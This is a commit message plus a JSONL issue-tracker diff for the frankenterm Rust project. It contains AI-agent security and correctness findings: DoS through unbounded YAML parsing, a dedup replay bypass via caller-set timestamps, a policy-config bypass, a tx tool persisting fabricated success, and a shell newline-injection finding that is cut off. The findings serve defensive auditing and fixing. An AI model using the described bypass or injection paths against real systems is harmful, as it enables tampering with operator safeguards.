message:
chore(beads): file ft-kbbc3 tx synthetic-success integrity finding

/multi-pass-bug-hunting pass on tx subsystem found wa.tx_run in
mcp_tools.rs:3089/:3121/:3150 routes synthetic-success inputs
(tx_prepare_gate_inputs_allow_all + mission_tx_commit_step_inputs +
mission_tx_compensation_inputs) into evaluate_prepare_phase /
execute_commit_phase / execute_compensation_phase, then persists the
fabricated Committed state to the tx contract file at :3186 via
mcp_save_mission_tx_contract_to_path.

The real PaneStepExecutor (tx_execution.rs:234) exists but is
grep-verified NOT wired into the MCP handler. wa.tx_run is currently a
persist-synthetic-success simulator dressed as real execution.

Related closed beads ft-bekwl / ft-npj7t fixed a parallel gap in
PaneStepExecutor's compensation path; this is a different gap
(handler-layer, not executor-layer). ft-73f9r's e2e test validates
deterministic-synthetic behavior so it doesn't catch this.

Filed P1 with concrete fix path (wire PaneStepExecutor + real inputs)
and two interim mitigation options (simulation-mode marker vs
explicit --simulate flag). Already gated by ft-x86z2's
mcp_authorize_mcp_mutation so remote exploitation path is closed; the
real hazard is downstream tools reading the fabricated contract file
as authoritative.

Agent: RusticMeadow

Co-Authored-By: Claude Opus 4.7 (1M context) <noreply@anthropic.com>

 {"id":"ft-05hfm","title":"[LOW] pattern-pack loader + wa.send have no size/depth caps; hostile input can DoS via memory","description":"Found during /security-audit-for-saas pass #8 (pane 5, 2026-04-21).

## Summary
Two unrelated input-validation gaps surfaced while auditing CLI and
MCP argument handling:

- **F1 (MEDIUM):** `load_pack_from_file` at patterns.rs:978 reads
  the entire pattern-pack file into memory via
  `std::fs::read_to_string` with NO size cap, then hands the bytes
  to `serde_yaml::from_str` / `serde_json::from_str` / `toml::
  from_str` with NO depth cap. A hostile `.ft/patterns/huge.yaml`
  (or JSON / TOML) in a cloned repo can exhaust the allocator or
  stack-overflow the YAML parser on deeply-nested constructs.
- **F2 (LOW):** `WaSendTool::call` and `WaRulesTestTool::call` do
  not bound the length of `params.text` before dispatching it.
  An MCP client can submit a multi-gigabyte `text` field; the MCP
  layer will buffer it, policy-evaluate it, and try to send it
  through `wezterm cli send-text`.

## Evidence

### F1
- crates/frankenterm-core/src/patterns.rs:978
  ```rust
  fn load_pack_from_file(path: &str, root: Option<&Path>) -> Result<PatternPack> {
      ...
      let content = std::fs::read_to_string(&resolved)
          .map_err(|e| PatternError::PackNotFound(...))?;
      let pack = match ext.as_str() {
          "yaml" | "yml" => serde_yaml::from_str(&content)...,
          "json" => serde_json::from_str(&content)...,
          "toml" => toml::from_str(&content)...,
          ...
      };
  ```
  No size cap on `content`. No depth cap on the deserializer.
  `serde_yaml` does not guard against billion-laughs by default
  (anchors are resolved in the YAML 1.2 spec), and deeply-nested
  constructs can stack-blow before the typed Deserialize even
  starts. Same attack class as ft-xv561 (ReDoS via hostile
  pattern regex), different primitive.

### F2
- crates/frankenterm-core/src/mcp_tools.rs:1799
  schema declares `"text": { "type": "string" }` with no
  `maxLength`. The tool body does not validate `params.text.len()`
  before `injector.send_text(..., &params.text, ...)`.
- Same gap in `WaRulesTestTool` at :420.
- `WaSendTool` does pass `params.text` through `engine.
  redact_secrets(...)` for the audit summary at :1876, but the
  raw text still goes downstream to wezterm without a length
  bound.

## Impact
Severity: LOW-MEDIUM.

- F1 requires the attacker to land a file inside a workspace the
  user clones, then `ft watch` (or any pattern-engine user)
  inhales it. DoS on the local process, not a remote exploit.
- F2 requires an MCP client — stdio transport runs under the
  user's uid/gid, so the attacker already has process
  equivalence. The concern is operator-hygiene: an auto-MCP
  pipeline that doesn't bound-check outbound `text` could OOM
  the `ft watch` process.

## Fix direction

### F1 — pattern pack loader
1. Cap `content` size before deserialize. Pick a pragmatic limit
   — e.g. `MAX_PACK_BYTES: usize = 1 * 1024 * 1024` (1 MiB). A
   legitimate pattern pack is a handful of rules and text; 1 MiB
   is three orders of magnitude above reasonable. Reject with
   `PatternError::PackTooLarge(path, size)`.
2. Use `serde_yaml::Deserializer::from_str(content).depth_limit(32)`
   — serde_yaml exposes the builder hook; default stack budget
   grows linearly with nesting.
3. Propagate parse errors without embedding the raw content in
   diagnostics (already done via `PatternError::InvalidRule(format!(
   "invalid YAML pack: {e}"))`).

### F2 — wa.send text length
1. Add `MAX_SEND_TEXT_BYTES: usize = 1 * 1024 * 1024` (1 MiB) at
   the WaSendTool::call entry.
2. Reject with `MCP_ERR_INVALID_ARGS` and a hint that pane input
   of legitimate shape should never exceed this bound.
3. Mirror the cap in WaRulesTestTool.

## Non-findings verified in the same pass

- `pane_id` bounds on `ft robot send`: `pane_id: u64` via clap.
  No upper bound at the CLI layer. Downstream `wezterm.send_text`
  looks up the pane by id; a nonexistent id returns
  `WeztermError::PaneNotFound`. No injection vector — `pane_id`
  is decimal-encoded into `--pane-id <N>` arg of `wezterm cli
  send-text`, which cannot be reinterpreted as a shell
  metacharacter. Clean.
- `ft snapshot restore <id>` path traversal: `snapshot_id` is
  parsed via `resolve_checkpoint_id` at main.rs:8208 which
  accepts only the literal "latest" or an `i64`. No path, no
  filesystem lookup. Clean.
- clap `env()` fallback on any arg: grep across
  `crates/frankenterm/src/main.rs` for `env(\"` returned zero
  hits. No argument pulls its value from an environment
  variable, so a process-env manipulation cannot bypass a
  missing CLI flag. Clean.

## Related
- ft-xv561 (070117a0) — same attack class (hostile pattern pack
  → DoS), different primitive (regex backtrack vs YAML parse).
- ft-kegvt (969b9e02) — same "restricted-input" family: user-
  supplied strings flowing into a trusted sink without a
  structural cap.

 {"id":"ft-080mv","title":"[review][LOW] ft-8ybme scan_pipeline fail-fast covers panic path but not recovery (flush-then-retry) path","description":"658b945a added an assert! at crates/frankenterm-core/src/scan_pipeline.rs:466-469 that panics when `process_chunk` is called with non-empty bytes after `should_flush` returned true. The regression test `chunked_process_chunk_panics_when_appending_after_flush_pending` at :940-950 exercises the PANIC path: overflow the buffer, assert should_flush=true, call process_chunk again, catch the panic via #[should_panic].

Not covered: the RECOVERY path. A well-behaved caller handles should_flush by calling flush_chunked (or equivalent) to drain the buffer, then continues process_chunk'ing. There is no test that verifies:

1. After should_flush=true, calling flush_chunked() resets should_flush back to false.
2. After a successful flush, a subsequent process_chunk does NOT panic and correctly resumes scanning.
3. Aho-Corasick LeftmostFirst invariant holds across the flush boundary — per MEMORY.md, the engine requires accumulate-then-batch-rescan at checkpoints. If flush resets trigger_data_buffer but the scan_state continues, a pattern that straddles the flush boundary could be missed OR double-counted depending on trigger scan semantics.

Fix path: add a positive test:

    #[test]
    fn chunked_process_chunk_resumes_after_flush() {
        let pipeline = ScanPipeline::default();
        let mut state = ChunkedPipelineState::new(64);

        pipeline.process_chunk(&[b'x'; 80], &mut state);
        assert!(state.should_flush());

        let flushed = pipeline.flush_chunked(&mut state);
        assert!(!state.should_flush(), "flush must reset the pending indicator");

        // Second chunk containing a trigger that would have been missed
        // if scan_state weren't preserved across the flush:
        let second = pipeline.process_chunk(b"error occurred", &mut state);
        assert!(second.trigger_counts.get(&TriggerCategory::Error).copied().unwrap_or(0) >= 1);
    }

If the recovery path is also flaky (e.g., scan_state doesn't survive flush, or Aho-Corasick batch rescan loses matches at the boundary) the test above would catch it.

Severity: LOW — panic path is tested and correct; positive path is an unverified assumption. Discovered during reviewer audit round 11, 2026-04-23 while verifying 658b945a.

Tag: review, scan-pipeline, test-coverage, aho-corasick.","status":"closed","priority":3,"issue_type":"bug","created_at":"2026-04-23T19:08:10.661613Z","created_by":"jemanuel","updated_at":"2026-04-23T21:22:08.388210Z","closed_at":"2026-04-23T21:22:08.388062Z","close_reason":"Shipped in d4e41dca: added flush-and-retry recovery coverage alongside the panic-path test","source_repo":".","compaction_level":0,"original_size":0,"labels":["review"]}
 {"id":"ft-0c8wp","title":"Correct README.md numerical claims: workspace crate count, vendored crate count, and module count","description":"# Goal
Fix the overstated numbers in README.md so the documentation matches reality. Documentation credibility matters — inflated numbers undermine trust in claims that ARE accurate.

# Background
The 2026-04-06 reality check found:
- README claims "120 workspace crates" → Actual: 63 workspace members in root Cargo.toml
- README claims "105 crates" from ex-WezTerm → Actual: 45 active vendored crates in frankenterm/ directory (95+ if counting legacy_wezterm/ checkpoint that isn't part of the workspace)
- README claims "482 modules" → Actual: 483 .rs files (off by 1, essentially correct)
- README claims "775k lines" → Actual: 793,698 lines (grew since README was written)
- README claims "45,000+ tests" → Actual: 46,633 (accurate, slightly understated)

# Changes Required
1. Update "120 workspace crates" to actual count. Options:
   a. "63 workspace crates" (strict workspace members)
   b. "63 workspace crates (plus 95+ legacy reference crates)" (honest with context)
2. Update vendored crate reference to "45 active vendored crates"
3. Update module count to 483 (or "480+" for durability)
4. Update line count to ~794k (or "790k+" for durability)
5. Keep test count as "45,000+" (still accurate)
6. Add a "last verified" date footnote for numerical claims

# Acceptance Criteria
1. Every numerical claim in README.md matches a verifiable count.
2. No claim is inflated. Rounding is always down or uses "N+" notation.
3. Badge at top of README matches actual numbers.
4. AGENTS.md workspace structure section is consistent with README.

# Implementation Notes
- The exact count will drift as development continues, so use "N+" notation for fast-moving numbers.
- The badge "Lines of Code" currently says "775k lines" — update to match.","status":"closed","priority":1,"issue_type":"task","estimated_minutes":30,"created_at":"2026-04-06T18:55:20.592960Z","created_by":"jemanuel","updated_at":"2026-04-07T01:46:03.711999Z","closed_at":"2026-04-07T01:46:03.711832Z","close_reason":"Updated README summary counts to verified current values","source_repo":".","compaction_level":0,"original_size":0,"labels":["accuracy","docs","readme"]}

 {"id":"ft-4qom2","title":"[SEV] tmux cmd_queue cap only enforced at pop site; unbounded growth when state != Idle","description":"frankenterm/mux/src/tmux.rs TmuxDomainState.cmd_queue has CMD_QUEUE_MAX_DEPTH=50_000 enforced only inside send_next_command at line 289 via cmd_queue.drain(..excess). send_next_command early-returns at line 286-288 when state != Idle, so the drain-oldest logic never runs if tmux is stuck in State::WaitingForResponse.

Four push sites append to cmd_queue with NO cap check:
- line 196: Event::LayoutChange -> ListAllPanes
- line 223: Event::SessionChanged -> ListCommands
- line 234: Event::WindowAdd -> ListAllWindows
- line 375: split_pane (user split) -> SplitPane

Concrete interleaving: (1) tmux sends a command, enters State::WaitingForResponse; (2) tmux server is slow/hung (real-world scenario: remote tmux on lagging SSH link, tmux server overloaded, Event::Guarded response delayed); (3) GUI user resizes window repeatedly -> stream of Event::LayoutChange -> each push_back at line 196 runs without cap check; (4) send_next_command early-returns because state != Idle. Queue grows unbounded -> memory leak, eventual OOM.

The CMD_QUEUE_MAX_DEPTH comment at line 32-33 explicitly advertises 'prevent unbounded memory growth during event storms' as a safety invariant. That invariant is currently only upheld at the pop site, where it can't run under the exact condition (stuck tmux) that event storms exploit.

Fix: extract the cap-enforcement logic into a push_command_capped helper that applies the drain-oldest + warn/error logging at every push site. The helper runs under the cmd_queue lock (just acquired by the caller), so it's atomic with the push and has no additional locking cost.","status":"closed","priority":1,"issue_type":"bug","created_at":"2026-04-21T00:17:26.601099Z","created_by":"jemanuel","updated_at":"2026-04-21T00:21:03.160715Z","closed_at":"2026-04-21T00:21:03.158111Z","close_reason":"Completed: added push_command_capped() helper and routed all 4 production push sites (LayoutChange/SessionChanged/WindowAdd/split_pane) through it. The hard cap is now enforced at push time, not only at pop time — closing the unbounded-growth window when tmux is stuck in State::WaitingForResponse. cargo check passes clean. Commit 1055cffc.","source_repo":".","compaction_level":0,"original_size":0}
 {"id":"ft-4r2ib","title":"[mission][dispatch] MissionDispatcher reports accepted dispatch without calling WorkflowRunner::handle_detection","description":"In `crates/frankenterm-core/src/mission_dispatch.rs:200-226`, `dispatch_single()` builds a synthetic detection, then only calls `runner.find_matching_workflow(&detection)` and fabricates `accepted: true` plus a synthetic `execution_id` when a workflow exists. It never invokes `WorkflowRunner::handle_detection()`, so no lock acquisition, no concurrency-limit enforcement, no storage row, and no real workflow start happen.

Impact: callers receive a success-shaped `DispatchResult` that claims work was accepted even though the runner was never asked to start anything.

Fix direction: bridge the sync mission loop to the async runner start path with a bounded runtime, map the actual `WorkflowStartResult` into `DispatchResult`, and only emit started metadata from a real start result.","status":"closed","priority":1,"issue_type":"bug","created_at":"2026-04-23T20:09:03.405716Z","created_by":"jemanuel","updated_at":"2026-04-23T20:16:34.545322Z","closed_at":"2026-04-23T20:16:34.544924Z","close_reason":"Shipped in 0761bb33: mission dispatch now calls WorkflowRunner::handle_detection and returns real start metadata","source_repo":".","compaction_level":0,"original_size":0}
 {"id":"ft-4z7vh","title":"RobotCommands::Workflow builds PolicyEngine without require_prompt_active/command_gate/rules — bypasses operator safety config","description":"AUTH BYPASS (robot mode mutations, Severity: Medium).

crates/frankenterm/src/main.rs has 10 PolicyEngine::new call sites. 8 of them wire require_prompt_active from config + .with_command_gate_config(config.safety.command_gate.clone()) + .with_policy_rules(config.safety.rules.clone()). Two do NOT, both under RobotCommands::Workflow:

Site 1 (main.rs:19831, RobotCommands::Workflow::Run):

  let policy_engine = PolicyEngine::new(
      config.safety.rate_limit_per_pane,
      config.safety.rate_limit_global,
      false, // Don't require prompt active for robot mode
  )
  .with_tuning(&config.tuning);

No command_gate, no policy_rules, and require_prompt_active hardcoded false. This engine is fed into CxPolicyInjector → WorkflowRunner; any workflow step that calls send_text (e.g., handle_compaction sending '/compact', handle_usage_limit sending '/refresh') bypasses:
  - the operator's safety.require_prompt_active=true policy,

 {"id":"ft-fs42k","title":"connector_outbound_bridge: dedup uses event.timestamp_ms (parallel ft-dijpe miss)","description":"## Defect

\`crates/frankenterm-core/src/connector_outbound_bridge.rs:1027\` passes
\`event.timestamp_ms\` (caller-supplied via the public
\`OutboundEvent::with_timestamp_ms\` builder, line 284) to
\`check_and_record\` as the dedup eviction clock — the exact shape that
ft-dijpe just fixed in the inbound bridge.

The ft-dijpe defect description even claimed *"Outbound bridge doesn't
have this shape — it uses its own \`now_ms\` from \`SystemTime::now()\`
for all internal state."* That claim is wrong. The outbound bridge's
constructor (line 245) does use \`SystemTime::now()\` to seed
\`timestamp_ms\` by default, but:

1. The public \`with_timestamp_ms\` builder (line 284) lets any caller
   override that default to an arbitrary value.
2. \`route_event\` line 1027 then passes that caller-controlled value
   directly to \`OutboundDeduplicator::check_and_record\`, which calls
   \`evict_expired(now_ms)\` and pops anything whose
   \`now_ms - inserted_at_ms > ttl_ms\`.
3. Same replay-bypass attack as ft-dijpe: a caller submitting two
   copies of the same correlation_id with the second copy's
   \`timestamp_ms = ttl_ms + 1\` triggers eviction of the first entry
   and the replay is treated as new.

## Concrete failure path

1. Internal caller (workflow handler, retry loop, test harness) builds
   an \`OutboundEvent\` and calls \`with_timestamp_ms\` to override the
   default \`SystemTime::now()\` (legitimate reason: replaying historical
   events for backfill, fixture-driven tests, or a buggy clock-advance
   helper).
2. First dispatch with \`correlation_id=X, timestamp_ms=0\`.
3. Second dispatch with \`correlation_id=X, timestamp_ms=ttl_ms+1\`.
4. \`evict_expired\` sees \`now_ms=ttl+1 > inserted_at=0+ttl\` → pops X.
5. \`check_and_record\` finds cache empty, inserts a new X, returns
   \`true\` → second dispatch routes as if new. All downstream
   side-effects fire twice (slack post, JIRA ticket, GitHub PR
   comment, credential broker call, etc.).

Trust model is weaker than inbound's — outbound events are
internally constructed rather than attacker-supplied — but the
defense-in-depth argument applies. A buggy internal caller that
mis-sets \`timestamp_ms\` should not silently bypass dedup, and
symmetry with the inbound bridge's hardening makes the codebase
easier to reason about.

## Severity rationale

- Same shape as ft-dijpe (silent dedup bypass), one severity level
  lower because the trust model is internal-only.
- Reachable today via any internal caller misusing
  \`with_timestamp_ms\`. Future caller bugs are likelier than
  attacker reach.

## Fix sketch

Mirror the ft-dijpe fix: in \`route_event\` line 1027, compute
\`now_ms\` from \`SystemTime::now().duration_since(UNIX_EPOCH).as_millis()\`
and pass that to \`check_and_record\` instead of \`event.timestamp_ms\`.
The \`event.timestamp_ms\` field stays useful as an analytics signal
(end-to-end source→sink latency, dispatch-history correlation) but
must NOT determine when dedup entries expire.

## Regression test

\`bridge_dedup_ignores_event_timestamp_ms_for_eviction\`: dispatch X
with \`correlation_id='r', timestamp_ms=0\`, then dispatch X with
\`correlation_id='r', timestamp_ms=u64::MAX/2\`. Assert the second is
\`deduplicated=true\`. Pre-fix the second returns \`deduplicated=false\`
because evict_expired with the spoofed future-timestamp pops the live
entry.

## Scope

\`crates/frankenterm-core/src/connector_outbound_bridge.rs\` only.
The line-1080 \`let now_ms = event.timestamp_ms\` (used downstream for
\`created_at_ms\`, \`broker_checked_at_ms\`, \`dispatched_at_ms\`) is a
separate concern — those telemetry timestamps arguably should also
be SystemTime::now() but that's a wider change. This bead covers
ONLY the dedup eviction clock.","status":"closed","priority":2,"issue_type":"bug","assignee":"pane0","created_at":"2026-04-22T17:25:28.629996Z","created_by":"jemanuel","updated_at":"2026-04-22T17:26:19.140282Z","closed_at":"2026-04-22T17:26:19.139925Z","close_reason":"Duplicate of ft-ptjlp (same defect, same line, parallel filing race). Sibling agent already applied the SystemTime::now() fix in working tree at connector_outbound_bridge.rs:1037-1044 with their own ft-ptjlp tag in the inline comment. Closing this bead so ft-ptjlp owns the fix and the test work. Reviewed their fix — it's identical to what I would have written (SystemTime::now() → dedup_now_ms → check_and_record), correctly preserves event.timestamp_ms for downstream telemetry uses.","source_repo":".","compaction_level":0,"original_size":0}

 {"id":"ft-g3z31","title":"[review][LOW] ft-ojgmo lacks regression test for pre-cancel fast-path in EventSubscriber::recv_cx","description":"fa1fbffe added two cancel-detection paths to EventSubscriber::recv_cx at crates/frankenterm-core/src/events.rs:789-817:

1. Pre-cancel fast-path at :793:
       if cx.is_cancel_requested() { return Err(RecvError::Cancelled); }
2. Mid-flight cancel watcher at :798-806 (select race with 50ms polling).

The new regression test `event_subscriber_recv_cx_surfaces_mid_flight_cancel` at :1573-1601 exercises the MID-FLIGHT path only — cancel is signalled 100ms AFTER recv_cx is entered. The PRE-CANCEL fast-path (cx already cancelled when recv_cx is called) is untested at the EventSubscriber layer.

Evidence: search for calls to EventSubscriber::recv_cx with a pre-cancelled cx in the test suite — none exist. The runtime_compat.rs test at :6189 tests pre-cancel on the lower-level broadcast_recv_with_cx primitive, but not the EventSubscriber wrapper that is the public API.

Why it matters: the pre-cancel shortcut is one line, but it was the difference between a hot loop of polling wakeups and immediate return. A refactor that moves the cancel check inside the select! block (losing the shortcut) would regress the behavior silently — the mid-flight test would still pass because the 50ms poll would eventually fire.

Fix: add a sibling test:

    #[test]
    fn event_subscriber_recv_cx_surfaces_pre_cancel_immediately() {
        run_async_test(async {
            let cx = crate::cx::Cx::for_testing();
            cx.cancel_with(crate::outcome::CancelKind::User, Some("pre-cancel"));
            let bus = EventBus::new(8);
            let mut sub = bus.subscribe();
            let started = Instant::now();
            let result = sub.recv_cx(&cx).await;
            assert!(matches!(result, Err(RecvError::Cancelled)));
            assert!(started.elapsed() < Duration::from_millis(5),
                "pre-cancel must return immediately, took {:?}", started.elapsed());
        });
    }

A <5ms assertion distinguishes the shortcut path from the 50ms poll path.

Severity: LOW — not a correctness bug, just a coverage gap. Discovered during reviewer audit round 11, 2026-04-23 while verifying fa1fbffe.

 {"id":"ft-jqvg5","title":"Resolve frankenterm-core clippy -D warnings gate","description":"# Workspace-level clippy gate

## Background
Discovered during ft-xbnl0.2.4 tick 356 verification sweep. The
`frankenterm-core` crate reports **17 clippy errors** when run with
`-D warnings`:

    cargo clippy --no-deps -p frankenterm-core \\
        --features distributed,asupersync-runtime,web \\
        --lib --tests -- -D warnings

All 17 errors are in files **unrelated to ft-xbnl0.2.4**:

- `src/ipc.rs`
- `src/robot_sdk_contracts.rs`
- `src/runtime.rs`
- `src/snapshot_engine.rs`
- `src/ui_query.rs`
- `src/workflows/engine.rs`
- `src/workflows/runner.rs`

These are from recent commits by other agents.

## Why not fix in ft-xbnl0.2.4
AGENTS.md explicitly instructs "NEVER ... disturb in ANY way the work of
other agents." The violations may be:
- awaiting `#[allow(...)]` annotations from their owners
- pending intentional restructures
- already planned for cleanup

Touching them without coordination could override the owners' planned
solutions.

## Fix categories observed (examples)
- `clippy::duration-suboptimal-units` — `Duration::from_millis(2_000)` should be `from_secs(2)`
- `clippy::redundant-closure` — `|| crate::foo()` should just be `crate::foo`
- `clippy::semicolon-if-nothing-returned` — trailing unit-valued expression without semicolon
- Several others (see `cargo clippy` output at time of fix)

## Suggested approach
For each file, coordinate with the owning agent (via Agent Mail or by checking
recent git history for active work) before applying fixes. Prefer:
1. Fixing real issues over `#[allow(...)]` annotations.
2. Single-file commits so each fix is easy to review.
3. Running `ubs` on each file after the clippy fix to avoid introducing
   new bugs in the cleanup.

## Not a blocker for ft-xbnl0.2.4
The ft-xbnl0.2.4-scoped files (`src/distributed.rs`, `src/metrics.rs`,
`src/runtime_compat.rs`, `tests/web.rs`, `tests/ft_xbnl0_2_4_*.rs`) produce
zero clippy warnings.

See: `docs/ft-xbnl0-2-4-completion-evidence.md §6.1.1`.","status":"closed","priority":3,"issue_type":"task","assignee":"FoggyRobin","created_at":"2026-04-18T18:04:55.194692Z","created_by":"jemanuel","updated_at":"2026-04-19T15:17:33.170677Z","closed_at":"2026-04-19T15:17:33.170424Z","close_reason":"done","source_repo":".","compaction_level":0,"original_size":0,"labels":["clippy","code-quality","workspace-gate"],"dependencies":[{"issue_id":"ft-jqvg5","depends_on_id":"ft-xbnl0.2.4","type":"related","created_at":"2026-04-18T18:05:03.540304Z","created_by":"jemanuel","metadata":"{}","thread_id":""}]}
 {"id":"ft-jz40p","title":"[MEDIUM] TimeSeries::percentile(NaN) returns smallest value instead of None","description":"# Defect

`crates/frankenterm-core/src/time_series.rs:239` — `TimeSeries::percentile_range` (and the `percentile` convenience that delegates to it).

Same class as ft-b4l62 (telemetry Histogram::quantile, fixed 2c7b891c). The function relies on `p.clamp(0.0, 1.0)` to validate its input, but `f64::clamp(NaN, _, _)` returns NaN (documented Rust behaviour), so a NaN `p` cascades through:

```rust
let p = p.clamp(0.0, 1.0);                          // NaN stays NaN
let idx = ((values.len() - 1) as f64 * p)           // NaN
    .round() as usize;                              // NaN as usize = 0
Some(values[idx])                                   // smallest value
```

A NaN quantile arg silently returns the smallest sample — a plausible-looking number that has no relationship to the requested percentile. Pre-fix the Histogram analog had the same bug; the fix pattern is identical.

## Fix

```rust
if values.is_empty() || p.is_nan() {
    return None;
}
```

Matches the ft-b4l62 disposition: NaN `p` is explicitly `None` rather than a silently-wrong small value.

## Tests

* `ft_jz40p_percentile_nan_returns_none` — pins None return for NaN p.
* `ft_jz40p_percentile_infinity_inputs_still_work` — regression: ±inf still clamp to 0.0/1.0 and return min/max samples (pre-existing contract, not broken by the new NaN guard).

## Scope

Single file (`time_series.rs`).","status":"closed","priority":2,"issue_type":"bug","assignee":"pane1","created_at":"2026-04-22T12:11:47.750602Z","created_by":"jemanuel","updated_at":"2026-04-22T17:22:17.756502Z","closed_at":"2026-04-22T17:22:17.756187Z","close_reason":"Fix and both regression tests already landed (time_series.rs:246-254 + :720-745). percentile_range now guards with 'if values.is_empty() || p.is_nan() { return None; }' at line 252, so percentile(NaN) returns None instead of silently returning the smallest sample via NaN-clamp-to-0 → (NaN as usize)==0 cascade. Regression tests: ft_jz40p_percentile_nan_returns_none (NaN→None on both percentile + percentile_range, plus sanity check that valid p=0.5 still works) and ft_jz40p_percentile_infinity_inputs_still_work (±inf continue clamping to 0.0/1.0 → min/max sample, pre-existing contract preserved). Verified: 38 time_series:: tests passed, 0 failed.","source_repo":".","compaction_level":0,"original_size":0}
+{"id":"ft-kbbc3","title":"[tx][integrity][P1] wa.tx_run evaluates synthetic (allow-all + always-success) inputs and persists fabricated Committed state to the tx contract file","description":"## Finding

The production MCP tool `wa.tx_run` at `crates/frankenterm-core/src/mcp_tools.rs:2985-3186` runs its prepare/commit/compensate pipeline on **synthetic inputs**, not on real executor outputs. It then persists the synthetic-success results to the tx contract file on disk.

### Call sequence

1. `wa.tx_run` handler loads the MissionTxContract from disk.
2. `let gate_inputs = mcp_build_tx_prepare_gate_inputs(&contract);` at :3089. Under the alias in mcp.rs:56 this resolves to `crate::plan::tx_prepare_gate_inputs_allow_all(contract)` — a helper at plan.rs:3438 that hardcodes `policy_passed: true`, `reservation_available: true`, `approval_satisfied: true`, `target_liveness: true` for every step.
3. `evaluate_prepare_phase` is fed those all-true inputs and returns AllReady.
4. `let commit_inputs = mcp_build_tx_commit_step_inputs(...)` at :3121 resolves to `mission_tx_commit_step_inputs` at plan.rs:3571, which hardcodes `success: true` for every step unless the caller explicitly passes `fail_step`.
5. Same for compensation.
6. The resulting `TxCommitReport` / `TxCompensationReport` is written back to the contract file via `mcp_save_mission_tx_contract_to_path` at :3186 with `lifecycle_state` set to the target (typically Committed) and receipts populated.

### Impact

- The MCP tool description at :2990 says "Execute deterministic tx prepare+commit and compensation on partial failure (robot parity)" — operators reasonably infer real execution.
- A peer agent invoking `wa.tx_run` on a contract with (e.g.) a step that SHOULD fail policy gating will see the contract transition to Committed on disk without any real policy check having fired.
- A downstream tool that queries the tx contract file (`wa.tx_show --include-contract`, operator dashboards, audit exports) will see a fabricated success state. The audit log will record the transitions without any runtime evidence that the underlying steps happened.
- The REAL executor infrastructure (`PaneStepExecutor` at tx_execution.rs:234, `TxExecutionEngine` at :731) is grep-verified to NOT be called from the MCP path (zero matches for either type in mcp_tools.rs). They exist but are unused by wa.tx_run.

### Related beads (context)

- ft-bekwl + ft-npj7t (both closed) fixed a parallel 'synthetic success in compensation' path in `PaneStepExecutor`. This bead is DIFFERENT: the MCP handler doesn't use `PaneStepExecutor` at all.
- ft-73f9r added an e2e test for wa.tx plan/run/rollback. That test validates deterministic-synthetic behavior, not real-executor behavior — so it doesn't catch this gap.

### Fix direction

The correct call sequence for `wa.tx_run` is:
1. Build a real `PaneStepExecutor` (needs wezterm handle, reservation manager, policy engine with rate limiter, storage).
2. Call `PaneStepExecutor::evaluate_gates(contract, now_ms)` for real prepare inputs.
3. Feed those to `evaluate_prepare_phase`.
4. If prepare passes, call `PaneStepExecutor::execute_steps(contract, fail_step, now_ms)` for real commit inputs.
5. Feed those to `execute_commit_phase`.
6. If commit fails partially, call `PaneStepExecutor::execute_compensations(contract, &commit, fail_for_step, now_ms)` and feed to `execute_compensation_phase`.

This is a substantial refactor: the MCP handler currently has neither the wezterm handle, reservation manager, nor policy engine in the right shape. Approximate size: ~150-200 LoC + per-step executor wiring.

### Interim mitigation

Until the real executor is wired, `wa.tx_run` should either:
(a) Return a clear 'simulation' marker in the envelope (e.g., `data.mode: "synthetic_preview"`) and refuse to persist lifecycle_state changes back to the contract file, OR
(b) Be gated behind an explicit `--simulate` flag and error when called without it.

(a) is the smaller diff and preserves current e2e tests. (b) is more operator-clear but breaks the tool's default behavior.

### Severity rationale

P1 (not P0):
- No direct remote exploitation path: MCP ships over stdio/localhost by default and `wa.tx_run` is already gated by `mcp_authorize_mcp_mutation` per ft-x86z2 (so it's behind policy auth).
- But the persisted synthetic-success state on disk is a real data-integrity hazard for any operator reading the tx contract file as authoritative.

 {"id":"ft-kcsae","title":"[mor:performance-engineering] storage.rs at 31k lines — is FTS5 indexing synchronous on the capture path?","description":"# Observation

storage.rs is 31,648 lines (largest module in the core crate). It
owns a SQLite connection with WAL, drives FTS5 virtual tables for
the lexical-search surface, and handles retention sweeps
(\`database_stats(..., retention_days)\` at line 3758).

FTS5 writes are expensive — they rebuild inverted-index pages on
INSERT/UPDATE. If the capture path writes rows AND the FTS5 trigger
runs synchronously in the same transaction, every captured segment
pays the indexing cost before the write returns, which is pushed
onto the hot path at the very point where backpressure is trying
to keep up.

Not verified in this pass — just the shape of the concern given
the size of storage.rs and the presence of FTS5. Worth a targeted
read of the capture-write code path.

# Question

Three measurements that would clarify whether this matters:

1. Is there a "defer FTS5 indexing to a background task" path, or
   do FTS5 triggers fire in the capture-write transaction?
2. What's the p99 latency of \`insert_pane_output\` under a 200-pane
   load with FTS5 enabled vs disabled?
3. Is there an async/batch FTS5 index-catchup task that operators
   can offload indexing to?

If (1) is "synchronous" and (2) shows meaningful gap between
enabled/disabled, then an async-index mode is probably the fattest
win in the capture subsystem. Memory budget permits: a lag of
seconds in search freshness is almost always an acceptable trade
for linear-capture throughput during incidents.

# Structural note

31k lines in one module suggests the subsystem has grown through
absorption rather than redesign. Might be worth sketching the
module boundaries as a separate planning exercise before
optimizing; "where does latency go when we write a segment" is a
question that should have a one-page answer.","status":"closed","priority":3,"issue_type":"task","created_at":"2026-04-21T17:36:06.994443Z","created_by":"mor-review","updated_at":"2026-04-23T00:18:49.264506Z","closed_at":"2026-04-21T18:01:07.435839Z","close_reason":"Answered. Q1 (sync or async?): SYNCHRONOUS — three AFTER INSERT/DELETE/UPDATE triggers at storage.rs:169-180 fire inside every append_segment_sync transaction (storage.rs:12308). Q2 (p99 measurement): not run — needs a load harness. Q3 (async catchup available?): infrastructure EXISTS (fts_pane_progress table storage.rs:472 + sync_fts_on_startup storage.rs:16131 + FtsSyncConfig storage.rs:2363) but is wired only for startup recovery and explicit rebuild, NOT for live capture. Follow-up for the actual move-to-deferred work filed as ft-wk5fo with concrete plan + risk notes + measurement prerequisite.","source_repo":".","compaction_level":0,"original_size":0,"labels":["fts5","mor","performance","storage"]}
 {"id":"ft-kegvt","title":"[MEDIUM] launch_agent pipes restored `command` into shell via send_text without CR/LF sanitization","description":"Found during /security-audit-for-saas pass #4 (pane 5, 2026-04-21).

## Summary
`restore_process.rs::launch_agent_legacy` (line 625) and
`launch_agent_cx` (line 648) build the command string for a restored
pane by `format!("{command}\r", ...)` and then sending it to the
pane shell via `self.wezterm.send_text(pane_id, &full_cmd)`. The
pane shell is an active interactive shell (not an argv-isolated
subprocess), so any `\r` or `\n` in `command` injects additional
lines into the shell's input buffer.

## Evidence
- crates/frankenterm-core/src/restore_process.rs:625
  ```rust
  async fn launch_agent_legacy(
      &self,
      pane_id: u64,
